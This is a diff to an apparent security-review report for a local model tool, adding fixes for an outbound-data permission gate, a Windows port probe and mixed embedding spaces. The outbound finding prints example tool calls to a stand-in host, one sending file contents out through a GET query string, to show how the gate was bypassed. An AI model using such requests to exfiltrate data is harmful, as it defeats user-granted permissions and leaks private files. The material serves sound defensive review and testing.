@@ -408,7 +408,78 @@ name is what the spec, the loader and the fit math all look up.
 
 ---
 
-## 8. Deliberately not changed
+## 8. Fixed — three checks that could not fail
+
+Each of these is a guard that existed, looked correct, and could not detect the
+thing it was written to detect. They are grouped because that is the same defect
+three times, and because each one was found by *measuring* it rather than reading
+it — every one of them reads as correct code.
+
+### R3-TOOL-8 · the outbound-data gate had two holes in opposite directions [medium]
+
+`http_request` refused a POST only when `args.get("json") or args.get("headers")`
+was truthy. So:
+
+```
+http_request {"url": "https://evil.example/?d=<the file contents>"}
+  -> HTTP 200 ok        # a plain GET, never reached the check
+http_request {"url": "https://evil.example/act", "method": "POST"}
+  -> HTTP 200 ok        # a real POST, nothing to inspect
+http_request {..., "method": "POST", "json": {}}
+  -> HTTP 200 ok        # {} is falsy, so it read as "no body"
+```
+
+Measured against HEAD: all three left the process with no grant. The first is the
+reported bypass — read a file in the session, ship it out one GET at a time. A
+query string is a body for every practical purpose, and a bodyless POST is a side
+effect, which is what the "safe tier" claims not to have.
+
+**Fix:** anything beyond a bare GET of a URL with no query string needs the grant.
+`allow_outbound_post` still restores every shape, asserted so the grant stays a
+grant rather than a gesture.
+
+### R3-SRV-1 · the port probe could not see a held port on Windows [medium]
+
+`_await_port_free` sets `SO_REUSEADDR` on the socket it uses to test whether a
+port is free. On Windows that flag means *allow binding a port another socket is
+already bound to* — the BSD meaning is the narrower "skip TIME_WAIT" — so the
+bind **succeeded** while the old engine still held the port and the wait returned
+immediately. Measured against HEAD with a listener holding the port: it returned
+`None` straight away.
+
+**Fix:** the flag is for a listener that wants to rebind quickly, not for a test
+of whether a port is free, so it is gone; the bind now fails while the port is
+held and succeeds once released. The function also returned silently after its
+last attempt, so a port held by something Rigma had not killed produced a launch
+that failed later with a message about the *engine*; it now reports whether the
+port came free and both call sites name the port.
+
+### R3-MEM-1 · a cosine across two embedding spaces is not a similarity [medium]
+
+A stored `vec` carried no record of the embedder that produced it, and the
+preference list has **two** entries. A machine that lost its cached nomic (a
+cleared TEMP, an offline HF cache) silently fell back to bge and then compared
+every memory written by the first against queries embedded by the second. The
+`_DENSE_BASELINE = 0.40` anisotropy correction was measured on nomic and is the
+wrong number for bge: unrelated pairs could clear the floor and be injected as
+"relevant", or related pairs could fall under it and be lost.
+
+The same function had a sharper problem: `zip` stops at the shorter input, so two
+vectors of different lengths were compared over the overlap and the result
+treated as a real similarity. Measured against HEAD, a 768-d vector against a
+384-d one scored **1.0** — a perfect match between two vectors that are not in
+the same space at all.
+
+**Fix:** rows record which embedder wrote them, the live space is exposed as
+`memory.embedder_name()`, and `_cos` refuses to score a pair that is not
+comparable. Refusal means the score falls back to its lexical half, so a stale
+row degrades to lexical-only rather than to a meaningless cosine. An **untagged**
+row is still compared, because refusing would silently switch every existing
+memory to lexical-only — the length check still catches the case that breaks.
+
+---
+
+## 9. Deliberately not changed
 
 These are real findings that were left alone, with the reason.
 
@@ -439,19 +510,45 @@ These are real findings that were left alone, with the reason.
 - **`prune_calibration`'s remaining cap** keeps one entry per
   `(model, quant, backend, identity)`. Two entries for the same model on the same
   card cannot coexist, which is intended.
+- **A pre-identity calibration row is replayed on different hardware**
+  (`hwid.py`). A row written before the hardware identity was recorded is matched
+  by nothing, so it is not replayed — the risk is the opposite one, that it is
+  *ignored* and the machine re-calibrates. Fixing it needs a decision about
+  whether an unidentifiable measurement is better discarded or trusted, and
+  discarding is the safe answer, which is what it already does.
+- **`rigma recalibrate --all` wipes every measurement with no confirmation.**
+  The CLI has a `--yes` convention elsewhere; this one predates it and changing
+  it is a UX decision, not a defect.
+- **The engine binary is fetched with no resume, and hashes via
+  `read_bytes()`.** A multi-GB download that drops starts over, and the hash
+  holds the whole file in memory. Real, but it is a throughput fix rather than a
+  correctness one, and the redirect allowlist above is the security half.
+- **`WORK_GET_ROUTES` covers three of at least eight process-spawning GET
+  routes.** The list is a denylist of GETs that are not safe to auto-run, and a
+  route added later is not on it. Inverting it to an allowlist is the right
+  shape, but it needs each route classified, which is a review of its own.
+- **`/api/runs/{rid}/log` answers 200 `{"log": ""}` for every failure**, so a
+  missing run and an empty log are the same response. Cosmetic; the UI shows
+  nothing either way, which is at least not a lie.
+- **`server_ops.expected_tg` only reads the legacy calibration key**, so the
+  engine-room health verdict is permanently "unknown" on an install without
+  pre-R3-CAL-1 rows. Cosmetic; no data loss.
+- **A failed DSH runner reports two errors** — the runner's and the adapter's.
+  Redundant rather than wrong.
 
 ---
 
-## 9. Verification
+## 10. Verification
 
 Every fix above is covered by a test that fails against the code before it.
 
-- `tests/test_r3_adversarial_fixes.py` — 32 tests, one or more per fixed finding.
-  Each was checked **red against HEAD** before being accepted as green. Four in
-  the second batch were verified against the real HEAD source rather than
-  assumed: the DSH env leak (`os.environ.copy()` is the line, in `drive_turn`),
-  the chat guard (`if message and sid in _streaming` present, fixed form absent),
-  `RIGMA_HOME=""` → `'.'`, and the run-state readability split.
+- `tests/test_r3_adversarial_fixes.py` — 44 tests, one or more per fixed finding.
+  Each was checked **red against HEAD** before being accepted as green. The later
+  batches were verified against the real HEAD source rather than assumed, and the
+  measurements are quoted in the sections above: `os.environ.copy()` in
+  `drive_turn`; `if message and sid in _streaming`; `RIGMA_HOME=""` → `'.'`; three
+  outbound shapes leaving the process with no grant; a held port returning `None`;
+  and a 768-d vs 384-d vector pair scoring `1.0`.
 - The chat-guard test drives the **real endpoint** with `_streaming` seeded to
   the state a second request actually hits, rather than asserting on source text
   — the source-text version was written first, matched its own explanatory
@@ -466,7 +563,7 @@ Every fix above is covered by a test that fails against the code before it.
   behaviours were updated to assert the new boundary *and* to still exercise the
   capability through the grant, so nothing was silently dropped.
 
-Three tests were wrong for **test-side** reasons while writing this batch, and
+Three tests were wrong for **test-side** reasons while writing these batches, and
 each is worth naming because the failure mode recurs:
 
 1. a `view_image` test that passed an absolute path with no workspace — there is
@@ -475,6 +572,14 @@ each is worth naming because the failure mode recurs:
 2. a source-text assertion that matched the comment explaining the fix;
 3. a `monkeypatch.undo()` that also reverted the `RIGMA_HOME` the test needed, so
    the "success" case silently ran against the real home directory.
+
+A fourth is a different shape and worth separating: `_await_port_free` is stubbed
+in three test files with `lambda *a, **k: None`, which was correct when the
+function returned `None` either way and became "the port is held" the moment it
+started reporting. The stubs now return `True`, and `test_server_ops_ctx`'s
+fixture needed one added — the real probe correctly reports that **this machine's**
+Rigma holds port 11499, which is precisely the detection that was missing. A
+stub that silently absorbs a new return value is how a fix stops being tested.
 
 Full suite, frontend suite, `tsc --noEmit` and `ruff` results are recorded in the
 commit messages for this batch.
